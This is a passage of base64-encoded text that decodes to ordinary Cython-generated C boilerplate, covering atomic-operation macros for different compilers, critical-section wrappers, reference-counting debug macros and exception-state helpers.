F9fcHl4X2F0b21pY19wdHJfdHlwZSBzdGQ6OmF0b21pY191aW50cHRyX3RcbiAgICAjZGVmaW5lIF9fcHl4X25vbmF0b21pY19wdHJfdHlwZSB1aW50cHRyX3RcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX3JlbGF4ZWQodmFsdWUpIHN0ZDo6YXRvbWljX2ZldGNoX2FkZF9leHBsaWNpdCh2YWx1ZSwgMSwgc3RkOjptZW1vcnlfb3JkZXJfcmVsYXhlZClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX2FjcV9yZWwodmFsdWUpIHN0ZDo6YXRvbWljX2ZldGNoX2FkZF9leHBsaWNpdCh2YWx1ZSwgMSwgc3RkOjptZW1vcnlfb3JkZXJfYWNxX3JlbClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwodmFsdWUpIHN0ZDo6YXRvbWljX2ZldGNoX3N1Yl9leHBsaWNpdCh2YWx1ZSwgMSwgc3RkOjptZW1vcnlfb3JkZXJfYWNxX3JlbClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19zdWIodmFsdWUsIGFyZykgc3RkOjphdG9taWNfZmV0Y2hfc3ViKHZhbHVlLCBhcmcpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW50X2NtcF9leGNoYW5nZSh2YWx1ZSwgZXhwZWN0ZWQsIGRlc2lyZWQpIHN0ZDo6YXRvbWljX2NvbXBhcmVfZXhjaGFuZ2Vfc3Ryb25nKHZhbHVlLCBleHBlY3RlZCwgZGVzaXJlZClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19sb2FkKHZhbHVlKSBzdGQ6OmF0b21pY19sb2FkKHZhbHVlKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpIHN0ZDo6YXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9sb2FkX3JlbGF4ZWQodmFsdWUpIHN0ZDo6YXRvbWljX2xvYWRfZXhwbGljaXQodmFsdWUsIHN0ZDo6bWVtb3J5X29yZGVyX3JlbGF4ZWQpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9sb2FkX2FjcXVpcmUodmFsdWUpIHN0ZDo6YXRvbWljX2xvYWRfZXhwbGljaXQodmFsdWUsIHN0ZDo6bWVtb3J5X29yZGVyX2FjcXVpcmUpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSh2YWx1ZSwgbmV3X3ZhbHVlKSBzdGQ6OmF0b21pY19leGNoYW5nZSh2YWx1ZSwgKF9fcHl4X25vbmF0b21pY19wdHJfdHlwZSluZXdfdmFsdWUpXG4gICAgI2lmIGRlZmluZWQoX19QWVhfREVCVUdfQVRPTUlDUykgJiYgZGVmaW5lZChfTVNDX1ZFUilcbiAgICAgICAgI3ByYWdtYSBtZXNzYWdlICgiVXNpbmcgc3RhbmRhcmQgQysrIGF0b21pY3MiKVxuICAgICNlbGlmIGRlZmluZWQoX19QWVhfREVCVUdfQVRPTUlDUylcbiAgICAgICAgI3dhcm5pbmcgIlVzaW5nIHN0YW5kYXJkIEMrKyBhdG9taWNzIlxuICAgICNlbmRpZlxuI2VsaWYgQ1lUSE9OX0FUT01JQ1MgJiYgKF9fR05VQ19fID49IDUgfHwgKF9fR05VQ19fID09IDQgJiZcXFxuICAgICAgICAgICAgICAgICAgICAoX19HTlVDX01JTk9SX18gPiAxIHx8XFxcbiAgICAgICAgICAgICAgICAgICAgKF9fR05VQ19NSU5PUl9fID09IDEgJiYgX19HTlVDX1BBVENITEVWRUxfXyA+PSAyKSkpKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3B0cl90eXBlIHZvaWQqXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9yZWxheGVkKHZhbHVlKSBfX3N5bmNfZmV0Y2hfYW5kX2FkZCh2YWx1ZSwgMSlcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX2FjcV9yZWwodmFsdWUpIF9fc3luY19mZXRjaF9hbmRfYWRkKHZhbHVlLCAxKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCh2YWx1ZSkgX19zeW5jX2ZldGNoX2FuZF9zdWIodmFsdWUsIDEpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3ViKHZhbHVlLCBhcmcpIF9fc3luY19mZXRjaF9hbmRfc3ViKHZhbHVlLCBhcmcpXG4gICAgc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fcHl4X2F0b21pY19pbnRfY21wX2V4Y2hhbmdlKF9fcHl4X2F0b21pY19pbnRfdHlwZSogdmFsdWUsIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSogZXhwZWN0ZWQsIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBkZXNpcmVkKSB7XG4gICAgICAgIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBvbGQgPSBfX3N5bmNfdmFsX2NvbXBhcmVfYW5kX3N3YXAodmFsdWUsICpleHBlY3RlZCwgZGVzaXJlZCk7XG4gICAgICAgIGludCByZXN1bHQgPSBvbGQgPT0gKmV4cGVjdGVkO1xuICAgICAgICAqZXhwZWN0ZWQgPSBvbGQ7XG4gICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgfVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2xvYWQodmFsdWUpIF9fc3luY19mZXRjaF9hbmRfYWRkKHZhbHVlLCAwKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpIF9fc3luY19sb2NrX3Rlc3RfYW5kX3NldCh2YWx1ZSwgbmV3X3ZhbHVlKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9yZWxheGVkKHZhbHVlKSBfX3N5bmNfZmV0Y2hfYW5kX2FkZCh2YWx1ZSwgMClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfYWNxdWlyZSh2YWx1ZSkgX19zeW5jX2ZldGNoX2FuZF9hZGQodmFsdWUsIDApXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSh2YWx1ZSwgbmV3X3ZhbHVlKSBfX3N5bmNfbG9ja190ZXN0X2FuZF9zZXQodmFsdWUsIChfX3B5eF9hdG9taWNfcHRyX3R5cGUpbmV3X3ZhbHVlKVxuICAgICNpZmRlZiBfX1BZWF9ERUJVR19BVE9NSUNTXG4gICAgICAgICN3YXJuaW5nICJVc2luZyBHTlUgYXRvbWljcyJcbiAgICAjZW5kaWZcbiNlbGlmIENZVEhPTl9BVE9NSUNTICYmIGRlZmluZWQoX01TQ19WRVIpXG4gICAgI2luY2x1ZGUgPGludHJpbi5oPlxuICAgICN1bmRlZiBfX3B5eF9hdG9taWNfaW50X3R5cGVcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfdHlwZSBsb25nXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcHRyX3R5cGUgdm9pZCpcbiAgICAjdW5kZWYgX19weXhfbm9uYXRvbWljX2ludF90eXBlXG4gICAgI2RlZmluZSBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgbG9uZ1xuICAgICNwcmFnbWEgaW50cmluc2ljIChfSW50ZXJsb2NrZWRFeGNoYW5nZUFkZCwgX0ludGVybG9ja2VkRXhjaGFuZ2UsIF9JbnRlcmxvY2tlZENvbXBhcmVFeGNoYW5nZSwgX0ludGVybG9ja2VkQ29tcGFyZUV4Y2hhbmdlUG9pbnRlciwgX0ludGVybG9ja2VkRXhjaGFuZ2VQb2ludGVyKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2luY3JfcmVsYXhlZCh2YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2VBZGQodmFsdWUsIDEpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9hY3FfcmVsKHZhbHVlKSBfSW50ZXJsb2NrZWRFeGNoYW5nZUFkZCh2YWx1ZSwgMSlcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwodmFsdWUpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkKHZhbHVlLCAtMSlcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19zdWIodmFsdWUsIGFyZykgX0ludGVybG9ja2VkRXhjaGFuZ2VBZGQodmFsdWUsIC1hcmcpXG4gICAgc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fcHl4X2F0b21pY19pbnRfY21wX2V4Y2hhbmdlKF9fcHl4X2F0b21pY19pbnRfdHlwZSogdmFsdWUsIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSogZXhwZWN0ZWQsIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBkZXNpcmVkKSB7XG4gICAgICAgIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBvbGQgPSBfSW50ZXJsb2NrZWRDb21wYXJlRXhjaGFuZ2UodmFsdWUsIGRlc2lyZWQsICpleHBlY3RlZCk7XG4gICAgICAgIGludCByZXN1bHQgPSBvbGQgPT0gKmV4cGVjdGVkO1xuICAgICAgICAqZXhwZWN0ZWQgPSBvbGQ7XG4gICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgfVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX2xvYWQodmFsdWUpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkKHZhbHVlLCAwKVxuICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlKHZhbHVlLCBuZXdfdmFsdWUpXG4gICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9sb2FkX3JlbGF4ZWQodmFsdWUpICoodm9pZCAqIHZvbGF0aWxlICopdmFsdWVcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfYWNxdWlyZSh2YWx1ZSkgX0ludGVybG9ja2VkQ29tcGFyZUV4Y2hhbmdlUG9pbnRlcih2YWx1ZSwgMCwgMClcbiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2V4Y2hhbmdlKHZhbHVlLCBuZXdfdmFsdWUpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlUG9pbnRlcih2YWx1ZSwgKF9fcHl4X2F0b21pY19wdHJfdHlwZSluZXdfdmFsdWUpXG4gICAgI2lmZGVmIF9fUFlYX0RFQlVHX0FUT01JQ1NcbiAgICAgICAgI3ByYWdtYSBtZXNzYWdlICgiVXNpbmcgTVNWQyBhdG9taWNzIilcbiAgICAjZW5kaWZcbiNlbHNlXG4gICAgI3VuZGVmIENZVEhPTl9BVE9NSUNTXG4gICAgI2RlZmluZSBDWVRIT05fQVRPTUlDUyAwXG4gICAgI2lmZGVmIF9fUFlYX0RFQlVHX0FUT01JQ1NcbiAgICAgICAgI3dhcm5pbmcgIk5vdCB1c2luZyBhdG9taWNzIlxuICAgICNlbmRpZlxuI2VuZGlmXG4jaWYgQ1lUSE9OX0FUT01JQ1NcbiAgICAjZGVmaW5lIF9fcHl4X2FkZF9hY3F1aXNpdGlvbl9jb3VudChtZW12aWV3KVxcXG4gICAgICAgICAgICAgX19weXhfYXRvbWljX2luY3JfcmVsYXhlZChfX3B5eF9nZXRfc2xpY2VfY291bnRfcG9pbnRlcihtZW12aWV3KSlcbiAgICAjZGVmaW5lIF9fcHl4X3N1Yl9hY3F1aXNpdGlvbl9jb3VudChtZW12aWV3KVxcXG4gICAgICAgICAgICBfX3B5eF9hdG9taWNfZGVjcl9hY3FfcmVsKF9fcHl4X2dldF9zbGljZV9jb3VudF9wb2ludGVyKG1lbXZpZXcpKVxuI2Vsc2VcbiAgICAjZGVmaW5lIF9fcHl4X2FkZF9hY3F1aXNpdGlvbl9jb3VudChtZW12aWV3KVxcXG4gICAgICAgICAgICBfX3B5eF9hZGRfYWNxdWlzaXRpb25fY291bnRfbG9ja2VkKF9fcHl4X2dldF9zbGljZV9jb3VudF9wb2ludGVyKG1lbXZpZXcpLCBtZW12aWV3LT5sb2NrKVxuICAgICNkZWZpbmUgX19weXhfc3ViX2FjcXVpc2l0aW9uX2NvdW50KG1lbXZpZXcpXFxcbiAgICAgICAgICAgIF9fcHl4X3N1Yl9hY3F1aXNpdGlvbl9jb3VudF9sb2NrZWQoX19weXhfZ2V0X3NsaWNlX2NvdW50X3BvaW50ZXIobWVtdmlldyksIG1lbXZpZXctPmxvY2spXG4jZW5kaWZcblxuXG4jaW5jbHVkZSA8c3RydWN0bWVtYmVyLmg+XG5cblxuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbiB2b2lkKlxuI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbjIgdm9pZCpcbiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fQmVnaW4xKGNzLCBhcmcpICh2b2lkKWNzXG4jZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0JlZ2luMihjcywgYXJnMSwgYXJnMikgKHZvaWQpY3NcbiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fRW5kMShjcylcbiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fRW5kMihjcylcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uIFB5Q3JpdGljYWxTZWN0aW9uXG4jZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uMiBQeUNyaXRpY2FsU2VjdGlvbjJcbiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fQmVnaW4xIFB5Q3JpdGljYWxTZWN0aW9uX0JlZ2luXG4jZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0JlZ2luMiBQeUNyaXRpY2FsU2VjdGlvbjJfQmVnaW5cbiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fRW5kMSBQeUNyaXRpY2FsU2VjdGlvbl9FbmRcbiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fRW5kMiBQeUNyaXRpY2FsU2VjdGlvbjJfRW5kXG4jZW5kaWZcbiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDAgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuI2RlZmluZSBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG8pIHtcbiNkZWZpbmUgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKSB9XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OIFB5X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT05cbiNkZWZpbmUgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04gUHlfRU5EX0NSSVRJQ0FMX1NFQ1RJT05cbiNlbmRpZlxuXG5cblxuXG5cblxuc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByO1xuc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcjtcbnN0cnVjdCBfX3B5eF9vYmpfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHI7XG5zdHJ1Y3QgX19weXhfb2JqXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByO1xuXG5cbnN0cnVjdCBfX3B5eF9vYmpfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciB7XG4gIFB5T2JqZWN0X0hFQURcbiAgUHlPYmplY3QgKl9fcHl4X2dlbmV4cHJfYXJnXzA7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2k7XG59O1xuXG5cblxuc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciB7XG4gIFB5T2JqZWN0X0hFQURcbiAgUHlPYmplY3QgKl9fcHl4X2dlbmV4cHJfYXJnXzA7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2k7XG59O1xuXG5cblxuc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciB7XG4gIFB5T2JqZWN0X0hFQURcbiAgUHlPYmplY3QgKl9fcHl4X2dlbmV4cHJfYXJnXzA7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2k7XG59O1xuXG5cblxuc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciB7XG4gIFB5T2JqZWN0X0hFQURcbiAgbG9uZyBfX3B5eF92X187XG59O1xuXG5cblxuXG5cbiNpZm5kZWYgQ1lUSE9OX1JFRk5BTk5ZXG4gICNkZWZpbmUgQ1lUSE9OX1JFRk5BTk5ZIDBcbiNlbmRpZlxuI2lmIENZVEhPTl9SRUZOQU5OWVxuICB0eXBlZGVmIHN0cnVjdCB7XG4gICAgdm9pZCAoKklOQ1JFRikodm9pZCosIFB5T2JqZWN0KiwgUHlfc3NpemVfdCk7XG4gICAgdm9pZCAoKkRFQ1JFRikodm9pZCosIFB5T2JqZWN0KiwgUHlfc3NpemVfdCk7XG4gICAgdm9pZCAoKkdPVFJFRikodm9pZCosIFB5T2JqZWN0KiwgUHlfc3NpemVfdCk7XG4gICAgdm9pZCAoKkdJVkVSRUYpKHZvaWQqLCBQeU9iamVjdCosIFB5X3NzaXplX3QpO1xuICAgIHZvaWQqICgqU2V0dXBDb250ZXh0KShjb25zdCBjaGFyKiwgUHlfc3NpemVfdCwgY29uc3QgY2hhciopO1xuICAgIHZvaWQgKCpGaW5pc2hDb250ZXh0KSh2b2lkKiopO1xuICB9IF9fUHl4X1JlZk5hbm55QVBJU3RydWN0O1xuICBzdGF0aWMgX19QeXhfUmVmTmFubnlBUElTdHJ1Y3QgKl9fUHl4X1JlZk5hbm55ID0gTlVMTDtcbiAgc3RhdGljIF9fUHl4X1JlZk5hbm55QVBJU3RydWN0ICpfX1B5eF9SZWZOYW5ueUltcG9ydEFQSShjb25zdCBjaGFyICptb2RuYW1lKTtcbiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucyB2b2lkICpfX3B5eF9yZWZuYW5ueSA9IE5VTEw7XG4gICNkZWZpbmUgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQobmFtZSwgYWNxdWlyZV9naWwpXFxcbiAgICAgICAgICBpZiAoYWNxdWlyZV9naWwpIHtcXFxuICAgICAgICAgICAgICBQeUdJTFN0YXRlX1NUQVRFIF9fcHl4X2dpbHN0YXRlX3NhdmUgPSBQeUdJTFN0YXRlX0Vuc3VyZSgpO1xcXG4gICAgICAgICAgICAgIF9fcHl4X3JlZm5hbm55ID0gX19QeXhfUmVmTmFubnktPlNldHVwQ29udGV4dCgobmFtZSksIChfX0xJTkVfXyksIChfX0ZJTEVfXykpO1xcXG4gICAgICAgICAgICAgIFB5R0lMU3RhdGVfUmVsZWFzZShfX3B5eF9naWxzdGF0ZV9zYXZlKTtcXFxuICAgICAgICAgIH0gZWxzZSB7XFxcbiAgICAgICAgICAgICAgX19weXhfcmVmbmFubnkgPSBfX1B5eF9SZWZOYW5ueS0+U2V0dXBDb250ZXh0KChuYW1lKSwgKF9fTElORV9fKSwgKF9fRklMRV9fKSk7XFxcbiAgICAgICAgICB9XG4gICNkZWZpbmUgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0Tm9naWwoKSB7XFxcbiAgICAgICAgICAgICAgUHlHSUxTdGF0ZV9TVEFURSBfX3B5eF9naWxzdGF0ZV9zYXZlID0gUHlHSUxTdGF0ZV9FbnN1cmUoKTtcXFxuICAgICAgICAgICAgICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcXFxuICAgICAgICAgICAgICBQeUdJTFN0YXRlX1JlbGVhc2UoX19weXhfZ2lsc3RhdGVfc2F2ZSk7XFxcbiAgICAgICAgICB9XG4gICNkZWZpbmUgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0Tm9naWwoKSB7XFxcbiAgICAgICAgICAgICAgUHlHSUxTdGF0ZV9TVEFURSBfX3B5eF9naWxzdGF0ZV9zYXZlID0gUHlHSUxTdGF0ZV9FbnN1cmUoKTtcXFxuICAgICAgICAgICAgICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcXFxuICAgICAgICAgICAgICBQeUdJTFN0YXRlX1JlbGVhc2UoX19weXhfZ2lsc3RhdGVfc2F2ZSk7XFxcbiAgICAgICAgICB9XG4gICNkZWZpbmUgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KClcXFxuICAgICAgICAgIF9fUHl4X1JlZk5hbm55LT5GaW5pc2hDb250ZXh0KCZfX3B5eF9yZWZuYW5ueSlcbiAgI2RlZmluZSBfX1B5eF9JTkNSRUYocikgIF9fUHl4X1JlZk5hbm55LT5JTkNSRUYoX19weXhfcmVmbmFubnksIChQeU9iamVjdCAqKShyKSwgKF9fTElORV9fKSlcbiAgI2RlZmluZSBfX1B5eF9ERUNSRUYocikgIF9fUHl4X1JlZk5hbm55LT5ERUNSRUYoX19weXhfcmVmbmFubnksIChQeU9iamVjdCAqKShyKSwgKF9fTElORV9fKSlcbiAgI2RlZmluZSBfX1B5eF9HT1RSRUYocikgIF9fUHl4X1JlZk5hbm55LT5HT1RSRUYoX19weXhfcmVmbmFubnksIChQeU9iamVjdCAqKShyKSwgKF9fTElORV9fKSlcbiAgI2RlZmluZSBfX1B5eF9HSVZFUkVGKHIpIF9fUHl4X1JlZk5hbm55LT5HSVZFUkVGKF9fcHl4X3JlZm5hbm55LCAoUHlPYmplY3QgKikociksIChfX0xJTkVfXykpXG4gICNkZWZpbmUgX19QeXhfWElOQ1JFRihyKSAgZG8geyBpZigocikgPT0gTlVMTCk7IGVsc2Uge19fUHl4X0lOQ1JFRihyKTsgfX0gd2hpbGUoMClcbiAgI2RlZmluZSBfX1B5eF9YREVDUkVGKHIpICBkbyB7IGlmKChyKSA9PSBOVUxMKTsgZWxzZSB7X19QeXhfREVDUkVGKHIpOyB9fSB3aGlsZSgwKVxuICAjZGVmaW5lIF9fUHl4X1hHT1RSRUYocikgIGRvIHsgaWYoKHIpID09IE5VTEwpOyBlbHNlIHtfX1B5eF9HT1RSRUYocik7IH19IHdoaWxlKDApXG4gICNkZWZpbmUgX19QeXhfWEdJVkVSRUYocikgZG8geyBpZigocikgPT0gTlVMTCk7IGVsc2Uge19fUHl4X0dJVkVSRUYocik7fX0gd2hpbGUoMClcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dChuYW1lLCBhY3F1aXJlX2dpbClcbiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHROb2dpbCgpXG4gICNkZWZpbmUgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KClcbiAgI2RlZmluZSBfX1B5eF9JTkNSRUYocikgUHlfSU5DUkVGKHIpXG4gICNkZWZpbmUgX19QeXhfREVDUkVGKHIpIFB5X0RFQ1JFRihyKVxuICAjZGVmaW5lIF9fUHl4X0dPVFJFRihyKVxuICAjZGVmaW5lIF9fUHl4X0dJVkVSRUYocilcbiAgI2RlZmluZSBfX1B5eF9YSU5DUkVGKHIpIFB5X1hJTkNSRUYocilcbiAgI2RlZmluZSBfX1B5eF9YREVDUkVGKHIpIFB5X1hERUNSRUYocilcbiAgI2RlZmluZSBfX1B5eF9YR09UUkVGKHIpXG4gICNkZWZpbmUgX19QeXhfWEdJVkVSRUYocilcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9QeV9YREVDUkVGX1NFVChyLCB2KSBkbyB7XFxcbiAgICAgICAgUHlPYmplY3QgKnRtcCA9IChQeU9iamVjdCAqKSByO1xcXG4gICAgICAgIHIgPSB2OyBQeV9YREVDUkVGKHRtcCk7XFxcbiAgICB9IHdoaWxlICgwKVxuI2RlZmluZSBfX1B5eF9YREVDUkVGX1NFVChyLCB2KSBkbyB7XFxcbiAgICAgICAgUHlPYmplY3QgKnRtcCA9IChQeU9iamVjdCAqKSByO1xcXG4gICAgICAgIHIgPSB2OyBfX1B5eF9YREVDUkVGKHRtcCk7XFxcbiAgICB9IHdoaWxlICgwKVxuI2RlZmluZSBfX1B5eF9ERUNSRUZfU0VUKHIsIHYpIGRvIHtcXFxuICAgICAgICBQeU9iamVjdCAqdG1wID0gKFB5T2JqZWN0ICopIHI7XFxcbiAgICAgICAgciA9IHY7IF9fUHl4X0RFQ1JFRih0bXApO1xcXG4gICAgfSB3aGlsZSAoMClcbiNkZWZpbmUgX19QeXhfQ0xFQVIocikgICAgZG8geyBQeU9iamVjdCogdG1wID0gKChQeU9iamVjdCopKHIpKTsgciA9IE5VTEw7IF9fUHl4X0RFQ1JFRih0bXApO30gd2hpbGUoMClcbiNkZWZpbmUgX19QeXhfWENMRUFSKHIpICAgZG8geyBpZigocikgIT0gTlVMTCkge1B5T2JqZWN0KiB0bXAgPSAoKFB5T2JqZWN0KikocikpOyByID0gTlVMTDsgX19QeXhfREVDUkVGKHRtcCk7fX0gd2hpbGUoMClcblxuXG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4jZGVmaW5lIF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoZXJyKSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzSW5TdGF0ZShfX3B5eF90c3RhdGUsIGVycilcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzSW5TdGF0ZShQeVRocmVhZFN0YXRlKiB0c3RhdGUsIFB5T2JqZWN0KiBlcnIpO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhlcnIpICBQeUVycl9FeGNlcHRpb25NYXRjaGVzKGVycilcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiNkZWZpbmUgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlICBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGU7XG4jZGVmaW5lIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduICBfX3B5eF90c3RhdGUgPSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQ7XG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBNlxuI2RlZmluZSBfX1B5eF9QeUVycl9PY2N1cnJlZCgpICAoX19weXhfdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbiAhPSBOVUxMKVxuI2RlZmluZSBfX1B5eF9QeUVycl9DdXJyZW50RXhjZXB0aW9uVHlwZSgpICAoX19weXhfdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbiA/IChQeU9iamVjdCopIFB5X1RZUEUoX19weXhfdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbikgOiAoUHlPYmplY3QqKSBOVUxMKVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlFcnJfT2NjdXJyZWQoKSAgKF9fcHl4X3RzdGF0ZS0+Y3VyZXhjX3R5cGUgIT0gTlVMTClcbiNkZWZpbmUgX19QeXhfUHlFcnJfQ3VycmVudEV4Y2VwdGlvblR5cGUoKSAgKF9fcHl4X3RzdGF0ZS0+Y3VyZXhjX3R5cGUpXG4jZW5kaWZcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuI2RlZmluZSBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuI2RlZmluZSBfX1B5eF9QeUVycl9PY2N1cnJlZCgpICAoUHlFcnJfT2NjdXJyZWQoKSAhPSBOVUxMKVxuI2RlZmluZSBfX1B5eF9QeUVycl9DdXJyZW50RXhjZXB0aW9uVHlwZSgpICBQeUVycl9PY2N1cnJlZCgpXG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4jZGVmaW5lIF9fUHl4X1B5RXJyX0NsZWFyKCkgX19QeXhfRXJyUmVzdG9yZShOVUxMLCBOVUxMLCBOVUxMKVxuI2RlZmluZSBfX1B5eF9FcnJSZXN0b3JlV2l0aFN0YXRlKHR5cGUsIHZhbHVlLCB0YikgIF9fUHl4X0VyclJlc3RvcmVJblN0YXRlKFB5VGhyZWFkU3RhdGVfR0VUKCksIHR5cGUsIHZhbHVlLCB0YilcbiNkZWZpbmUgX19QeXhfRXJyRmV0Y2hXaXRoU3RhdGUodHlwZSwgdmFsdWUsIHRiKSAgICBfX1B5eF9FcnJGZXRjaEluU3RhdG